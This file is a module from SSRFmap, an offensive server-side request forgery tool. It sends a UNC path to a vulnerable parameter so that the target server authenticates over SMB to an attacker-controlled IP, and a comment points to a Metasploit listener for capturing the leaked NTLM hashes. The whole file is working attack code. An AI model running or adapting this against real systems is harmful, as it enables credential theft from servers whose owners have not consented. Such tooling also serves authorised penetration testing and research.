from ssrfmap.core.utils import *
import logging

# NOTE
# Use auxiliary/server/capture/smb from Metasploit to setup a listener

name          = "smbhash"
description   = "Force an SMB authentication attempt by embedding a UNC path (\\SERVER\SHARE) "
author        = "Swissky"
documentation = []

class exploit():
    UNC_EXAMPLE = "\\\\192.168.1.2\\SSRFmap"
    UNC_IP      = "192.168.1.2"
    UNC_FILE    = "SSRFmap"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        UNC_IP   = input("UNC IP (default: 192.168.1.2): ")
        if UNC_IP != '':
            self.UNC_IP = UNC_IP

        UNC_FILE = input("UNC File (default: SSRFmap): ")
        if UNC_FILE != '':
            self.UNC_FILE = UNC_FILE
        
        payload = wrapper_unc(self.UNC_FILE, self.UNC_IP)
        r = requester.do_request(args.param, payload)
        logging.info("\033[32mSending UNC Path\033[0m : {}".format(payload))
